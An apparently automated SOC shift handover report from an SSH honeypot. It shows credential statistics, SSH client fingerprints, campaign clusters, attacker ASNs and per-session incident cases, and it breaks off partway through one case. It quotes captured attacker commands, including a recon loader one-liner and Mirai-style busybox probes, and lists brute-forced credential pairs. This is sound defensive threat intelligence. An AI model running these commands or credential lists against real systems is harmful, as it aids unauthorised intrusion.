# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-01 |
| **Generated At** | 2026-07-01T16:30:18Z |
| **Shift Time** | 16:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **231** |
| Confirmed Threats | **226** |
| False Positives Filtered | **5** (2.2%) |
| Unique Attacker IPs | **51** |
| Countries of Origin | **15** |
| High Severity Cases | **110** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **121** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **148** |
| Unique Credential Pairs | **92** |
| Unique Usernames | **21** |
| Unique Passwords | **78** |
| Successful Auth Pairs | **123** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 84 |
| `345gs5662d34` | 24 |
| `ubuntu` | 11 |
| `admin` | 4 |
| `test` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `123456` | 6 |
| `admin` | 5 |
| `q1q2q3q4` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 19 |
| `ubuntu` | `q1q2q3q4` | 3 |
| `admin` | `admin` | 3 |
| `root` | `123456` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `1234` | `45.198.224.120` | 2026-07-01T11:00:09 |
| `root` | `P@ssw0rd2016` | `45.205.1.42` | 2026-07-01T11:00:24 |
| `root` | `qawsedrf` | `45.198.224.120` | 2026-07-01T11:11:30 |
| `root` | `` | `94.154.43.10` | 2026-07-01T11:17:20 |
| `root` | `Qwe123123` | `45.205.1.42` | 2026-07-01T11:17:39 |
| `root` | `Pr!vat3Sh3llAcc3sS` | `45.198.224.120` | 2026-07-01T11:22:42 |
| `ubuntu` | `q1q2q3q4` | `185.242.3.195` | 2026-07-01T11:24:29 |
| `wangxin5` | `wangxin5` | `45.198.224.120` | 2026-07-01T11:34:15 |
| `root` | `P@ssw0rd123` | `45.205.1.42` | 2026-07-01T11:34:54 |
| `admin` | `admin` | `47.253.156.31` | 2026-07-01T11:40:03 |
| `ubuntu` | `1234567890qwertyuiop` | `45.198.224.120` | 2026-07-01T11:45:24 |
| `root` | `Hw123456` | `177.128.224.122` | 2026-07-01T11:46:37 |
| `345gs5662d34` | `345gs5662d34` | `177.128.224.122` | 2026-07-01T11:46:40 |
| `root` | `3245gs5662d34` | `177.128.224.122` | 2026-07-01T11:46:41 |
| `ubuntu` | `1029384756` | `154.83.196.237` | 2026-07-01T11:49:30 |
| `345gs5662d34` | `345gs5662d34` | `154.83.196.237` | 2026-07-01T11:49:33 |
| `ubuntu` | `3245gs5662d34` | `154.83.196.237` | 2026-07-01T11:49:34 |
| `root` | `123456q` | `186.96.158.180` | 2026-07-01T11:50:24 |
| `345gs5662d34` | `345gs5662d34` | `186.96.158.180` | 2026-07-01T11:50:26 |
| `root` | `3245gs5662d34` | `186.96.158.180` | 2026-07-01T11:50:27 |
| `root` | `Server2024@` | `181.129.41.162` | 2026-07-01T11:51:48 |
| `345gs5662d34` | `345gs5662d34` | `181.129.41.162` | 2026-07-01T11:51:51 |
| `root` | `3245gs5662d34` | `181.129.41.162` | 2026-07-01T11:51:51 |
| `root` | `justin` | `45.205.1.42` | 2026-07-01T11:52:00 |
| `root` | `4rfvBGT%` | `73.36.177.174` | 2026-07-01T11:55:00 |
| `345gs5662d34` | `345gs5662d34` | `73.36.177.174` | 2026-07-01T11:55:02 |
| `root` | `3245gs5662d34` | `73.36.177.174` | 2026-07-01T11:55:02 |
| `root` | `adil123` | `97.93.43.157` | 2026-07-01T11:55:07 |
| `345gs5662d34` | `345gs5662d34` | `97.93.43.157` | 2026-07-01T11:55:10 |
| `root` | `3245gs5662d34` | `97.93.43.157` | 2026-07-01T11:55:10 |
| `http` | `http` | `45.198.224.120` | 2026-07-01T11:56:39 |
| `root` | `Pw123456` | `185.174.69.65` | 2026-07-01T11:57:57 |
| `345gs5662d34` | `345gs5662d34` | `185.174.69.65` | 2026-07-01T11:58:46 |
| `root` | `3245gs5662d34` | `185.174.69.65` | 2026-07-01T11:58:50 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-01T11:59:53 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-01T11:59:53 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-01T11:59:57 |
| `jeu` | `123456` | `61.151.249.194` | 2026-07-01T12:01:54 |
| `root` | `Wl123456` | `111.228.13.226` | 2026-07-01T12:03:59 |
| `345gs5662d34` | `345gs5662d34` | `111.228.13.226` | 2026-07-01T12:04:05 |
| `root` | `3245gs5662d34` | `111.228.13.226` | 2026-07-01T12:04:08 |
| `xp` | `123456` | `125.31.2.160` | 2026-07-01T12:04:38 |
| `345gs5662d34` | `345gs5662d34` | `125.31.2.160` | 2026-07-01T12:04:42 |
| `xp` | `3245gs5662d34` | `125.31.2.160` | 2026-07-01T12:04:43 |
| `ubuntu` | `q1q2q3q4` | `10.0.0.73` | 2026-07-01T12:04:50 |
| `www-data` | `1234` | `45.198.224.120` | 2026-07-01T12:08:06 |
| `yangliusha5` | `yangliusha5` | `45.205.1.42` | 2026-07-01T12:08:56 |
| `root` | `m0n1t0r` | `45.198.224.120` | 2026-07-01T12:19:31 |
| `root` | `Pass@5rdx` | `45.205.1.42` | 2026-07-01T12:25:48 |
| `ubuntu` | `12345` | `45.198.224.120` | 2026-07-01T12:31:03 |
| `root` | `house123` | `10.0.0.73` | 2026-07-01T12:31:54 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-01T12:31:57 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T12:31:57 |
| `admin` | `admin` | `118.145.245.82` | 2026-07-01T12:32:57 |
| `root` | `password` | `118.31.229.191` | 2026-07-01T12:33:34 |
| `root` | `root.123` | `10.0.0.73` | 2026-07-01T12:34:09 |
| `root` | `qahiliselo` | `10.0.0.73` | 2026-07-01T12:34:33 |
| `root` | `P@ssw0rd01` | `10.0.0.73` | 2026-07-01T12:40:59 |
| `ftptest` | `123456789` | `10.0.0.73` | 2026-07-01T12:41:53 |
| `ftptest` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T12:41:56 |
| `postgres` | `1qaz@WSX` | `10.0.0.73` | 2026-07-01T12:42:22 |
| `ubuntu` | `postgres1234` | `45.198.224.120` | 2026-07-01T12:42:24 |
| `postgres` | `3245gs5662d34` | `10.0.0.73` | 2026-07-01T12:42:25 |
| `root` | `12345678a` | `45.205.1.42` | 2026-07-01T12:42:52 |
| `root` | `123456mn` | `10.0.0.73` | 2026-07-01T12:44:25 |
| `root` | `Hy@123456` | `10.0.0.73` | 2026-07-01T12:47:55 |
| `root` | `---fuck_you----` | `43.99.61.165` | 2026-07-01T12:50:19 |
| `test` | `123456b` | `45.198.224.120` | 2026-07-01T12:53:48 |
| `root` | `Password01!` | `185.242.3.195` | 2026-07-01T12:56:10 |
| `user13` | `user13` | `10.0.0.73` | 2026-07-01T12:57:50 |
| `root` | `P@ss1234` | `45.205.1.42` | 2026-07-01T13:00:05 |
| `root` | `P4ssw0rds` | `45.198.224.120` | 2026-07-01T13:05:39 |
| `ubuntu` | `ADM@123!` | `45.205.1.42` | 2026-07-01T13:16:54 |
| `yangliusha5` | `yangliusha5` | `45.198.224.120` | 2026-07-01T13:17:13 |
| `root` | `qwert12345!@#$%` | `45.198.224.120` | 2026-07-01T13:29:02 |
| `root` | `qaz@123456789` | `69.5.20.232` | 2026-07-01T13:33:09 |
| `345gs5662d34` | `345gs5662d34` | `69.5.20.232` | 2026-07-01T13:33:24 |
| `root` | `3245gs5662d34` | `69.5.20.232` | 2026-07-01T13:33:35 |
| `root` | `Password!@#123` | `45.205.1.42` | 2026-07-01T13:33:52 |
| `root` | `P@$$word03` | `20.228.193.165` | 2026-07-01T13:36:52 |
| `345gs5662d34` | `345gs5662d34` | `20.228.193.165` | 2026-07-01T13:36:53 |
| `root` | `3245gs5662d34` | `20.228.193.165` | 2026-07-01T13:36:53 |
| `root` | `Password01!` | `10.0.0.73` | 2026-07-01T13:36:54 |
| `admin` | `admin` | `116.41.81.52` | 2026-07-01T13:37:04 |
| `ubuntu` | `postgres123` | `45.198.224.120` | 2026-07-01T13:41:00 |
| `root` | `Pa$$w0rd2021` | `187.170.65.227` | 2026-07-01T13:47:21 |
| `345gs5662d34` | `345gs5662d34` | `187.170.65.227` | 2026-07-01T13:47:23 |
| `root` | `3245gs5662d34` | `187.170.65.227` | 2026-07-01T13:47:24 |
| `wangxin1` | `wangxin1` | `45.205.1.42` | 2026-07-01T13:51:28 |
| `yunyun` | `yunyun` | `45.198.224.120` | 2026-07-01T13:53:03 |
| `root` | `#qlalf#wiseit#qjsgh#` | `36.64.131.68` | 2026-07-01T13:58:21 |
| `345gs5662d34` | `345gs5662d34` | `36.64.131.68` | 2026-07-01T13:58:25 |
| `root` | `3245gs5662d34` | `36.64.131.68` | 2026-07-01T13:58:27 |
| `debian` | `123456` | `45.198.224.120` | 2026-07-01T14:05:02 |
| `zhangwei3` | `zhangwei3` | `45.205.1.42` | 2026-07-01T14:09:04 |
| `ubuntu` | `abcd12345678` | `45.198.224.120` | 2026-07-01T14:16:45 |
| `23` | `root` | `83.168.69.141` | 2026-07-01T14:19:55 |
| `23` | `admin` | `83.168.69.141` | 2026-07-01T14:21:39 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-01T14:22:47 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-01T14:22:48 |
| `root` | `pass123456` | `45.205.1.42` | 2026-07-01T14:26:11 |
| `suliyilei1` | `suliyilei1` | `185.242.3.195` | 2026-07-01T14:28:25 |
| `nagios` | `nagios1` | `45.198.224.120` | 2026-07-01T14:29:03 |
| `root` | `admin` | `91.92.40.240` | 2026-07-01T14:29:41 |
| `root` | `password` | `91.92.40.240` | 2026-07-01T14:31:30 |
| `root` | `toor` | `91.92.40.240` | 2026-07-01T14:35:11 |
| `root` | `qwerty` | `91.92.40.240` | 2026-07-01T14:37:00 |
| `root` | `aa789456` | `10.0.0.73` | 2026-07-01T14:37:18 |
| `root` | `12345` | `91.92.40.240` | 2026-07-01T14:38:46 |
| `root` | `letmein` | `91.92.40.240` | 2026-07-01T14:40:37 |
| `root` | `qweasdqwe` | `10.0.0.73` | 2026-07-01T14:41:16 |
| `root` | `a123456789` | `45.198.224.120` | 2026-07-01T14:41:50 |
| `root` | `123456789` | `91.92.40.240` | 2026-07-01T14:42:33 |
| `root` | `bailey` | `45.205.1.42` | 2026-07-01T14:43:41 |
| `root` | `admin123` | `91.92.40.240` | 2026-07-01T14:44:33 |
| `root` | `welcome` | `91.92.40.240` | 2026-07-01T14:46:46 |
| `root` | `P@ssw0rd` | `91.92.40.240` | 2026-07-01T14:49:12 |
| `root` | `passw0rd` | `91.92.40.240` | 2026-07-01T14:51:51 |
| `test` | `abcd` | `168.76.131.178` | 2026-07-01T14:54:09 |
| `345gs5662d34` | `345gs5662d34` | `168.76.131.178` | 2026-07-01T14:54:13 |
| `test` | `3245gs5662d34` | `168.76.131.178` | 2026-07-01T14:54:15 |
| `root` | `linux@123` | `45.198.224.120` | 2026-07-01T14:54:24 |
| `root` | `root123` | `91.92.40.240` | 2026-07-01T14:54:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **231** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 56 |
| libssh | 44 |
| Paramiko (Python) | 5 |
| Unknown | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 40 | 3 |
| `f555226df196...` | Mirai/variant | 35 | 12 |
| `2ec37a7cc8da...` | Mirai/variant | 14 | 1 |
| `03a80b21afa8...` | Modern SSH client | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 5 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 40 | 3 | Generic scanner |
| `f555226df196...` | libssh | 35 | 12 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 14 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 9 | 3 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `1b8acd46a07d...` | Unknown | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 12 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 15 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.240`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
sh
```
```
shell
```
```
enable
```
```
system
```
```
ping; sh
```
Source IPs: `116.41.81.52`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **51** |
| Unique ASNs | **37** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (109)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bb86daca8e79

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:00 |
| **Last Seen** | 2026-07-01 11:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:00:02` | `cowrie.session.connect` |
| `2026-07-01 11:00:04` | `cowrie.client.version` |
| `2026-07-01 11:00:04` | `cowrie.client.kex` |
| `2026-07-01 11:00:09` | `cowrie.login.success` |
| `2026-07-01 11:00:13` | `cowrie.session.params` |
| `2026-07-01 11:00:13` | `cowrie.command.input` |
| `2026-07-01 11:00:14` | `cowrie.log.closed` |
| `2026-07-01 11:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0195fffeba42

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 11:00 |
| **Last Seen** | 2026-07-01 11:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:00:21` | `cowrie.session.connect` |
| `2026-07-01 11:00:22` | `cowrie.client.version` |
| `2026-07-01 11:00:22` | `cowrie.client.kex` |
| `2026-07-01 11:00:24` | `cowrie.login.success` |
| `2026-07-01 11:00:26` | `cowrie.session.params` |
| `2026-07-01 11:00:26` | `cowrie.command.input` |
| `2026-07-01 11:00:27` | `cowrie.log.closed` |
| `2026-07-01 11:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0eb9be2efe

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:11 |
| **Last Seen** | 2026-07-01 11:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:11:23` | `cowrie.session.connect` |
| `2026-07-01 11:11:24` | `cowrie.client.version` |
| `2026-07-01 11:11:24` | `cowrie.client.kex` |
| `2026-07-01 11:11:30` | `cowrie.login.success` |
| `2026-07-01 11:11:34` | `cowrie.session.params` |
| `2026-07-01 11:11:34` | `cowrie.command.input` |
| `2026-07-01 11:11:36` | `cowrie.log.closed` |
| `2026-07-01 11:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2b8b46c9345

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]10` |
| **First Seen** | 2026-07-01 11:17 |
| **Last Seen** | 2026-07-01 11:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:17:20` | `cowrie.session.connect` |
| `2026-07-01 11:17:20` | `cowrie.login.success` |
| `2026-07-01 11:17:21` | `cowrie.session.params` |
| `2026-07-01 11:17:21` | `cowrie.command.input` |
| `2026-07-01 11:17:22` | `cowrie.command.input` |
| `2026-07-01 11:17:23` | `cowrie.command.input` |
| `2026-07-01 11:17:23` | `cowrie.command.input` |
| `2026-07-01 11:17:23` | `cowrie.command.failed` |
| `2026-07-01 11:17:24` | `cowrie.log.closed` |
| `2026-07-01 11:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]10` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f90d5fa9168

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 11:17 |
| **Last Seen** | 2026-07-01 11:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:17:35` | `cowrie.session.connect` |
| `2026-07-01 11:17:36` | `cowrie.client.version` |
| `2026-07-01 11:17:36` | `cowrie.client.kex` |
| `2026-07-01 11:17:39` | `cowrie.login.success` |
| `2026-07-01 11:17:42` | `cowrie.session.params` |
| `2026-07-01 11:17:42` | `cowrie.command.input` |
| `2026-07-01 11:17:42` | `cowrie.log.closed` |
| `2026-07-01 11:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c67e2be662d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:22 |
| **Last Seen** | 2026-07-01 11:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:22:35` | `cowrie.session.connect` |
| `2026-07-01 11:22:37` | `cowrie.client.version` |
| `2026-07-01 11:22:37` | `cowrie.client.kex` |
| `2026-07-01 11:22:42` | `cowrie.login.success` |
| `2026-07-01 11:22:46` | `cowrie.session.params` |
| `2026-07-01 11:22:46` | `cowrie.command.input` |
| `2026-07-01 11:22:47` | `cowrie.log.closed` |
| `2026-07-01 11:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-941e8bbdabb2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 11:24 |
| **Last Seen** | 2026-07-01 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:24:28` | `cowrie.session.connect` |
| `2026-07-01 11:24:28` | `cowrie.client.version` |
| `2026-07-01 11:24:28` | `cowrie.client.kex` |
| `2026-07-01 11:24:29` | `cowrie.login.success` |
| `2026-07-01 11:24:30` | `cowrie.session.params` |
| `2026-07-01 11:24:30` | `cowrie.command.input` |
| `2026-07-01 11:24:30` | `cowrie.log.closed` |
| `2026-07-01 11:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ccd242913e7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:34 |
| **Last Seen** | 2026-07-01 11:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:34:07` | `cowrie.session.connect` |
| `2026-07-01 11:34:09` | `cowrie.client.version` |
| `2026-07-01 11:34:09` | `cowrie.client.kex` |
| `2026-07-01 11:34:15` | `cowrie.login.success` |
| `2026-07-01 11:34:19` | `cowrie.session.params` |
| `2026-07-01 11:34:19` | `cowrie.command.input` |
| `2026-07-01 11:34:20` | `cowrie.log.closed` |
| `2026-07-01 11:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9555e5ed7e4

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 11:34 |
| **Last Seen** | 2026-07-01 11:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:34:51` | `cowrie.session.connect` |
| `2026-07-01 11:34:52` | `cowrie.client.version` |
| `2026-07-01 11:34:52` | `cowrie.client.kex` |
| `2026-07-01 11:34:54` | `cowrie.login.success` |
| `2026-07-01 11:34:55` | `cowrie.session.params` |
| `2026-07-01 11:34:55` | `cowrie.command.input` |
| `2026-07-01 11:34:56` | `cowrie.log.closed` |
| `2026-07-01 11:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd1d1692880

| Field | Detail |
|---|---|
| **Source IP** | `47.253.156[.]31` |
| **First Seen** | 2026-07-01 11:39 |
| **Last Seen** | 2026-07-01 11:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:39:02` | `cowrie.session.connect` |
| `2026-07-01 11:39:03` | `cowrie.telnet.option` |
| `2026-07-01 11:39:03` | `cowrie.telnet.option` |
| `2026-07-01 11:40:03` | `cowrie.login.success` |
| `2026-07-01 11:40:04` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.253.156[.]31` to AbuseIPDB if not already reported
- [ ] Block `47.253.156[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b3eac10683

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 11:45 |
| **Last Seen** | 2026-07-01 11:45 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 11:45:16` | `cowrie.session.connect` |
| `2026-07-01 11:45:17` | `cowrie.client.version` |
| `2026-07-01 11:45:17` | `cowrie.client.kex` |
| `2026-07-01 11:45:24` | `cowrie.login.success` |
| `2026-07-01 11:45:27` | `cowrie.session.params` |
| `2026-07-01 11:45:27` | `cowrie.command.input` |
| `2026-07-01 11:45:28` | `cowrie.log.closed` |
| `2026-07-01 11:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eab61f0288c

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-07-01 11:46 |
| **Last Seen** | 2026-07-01 11:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
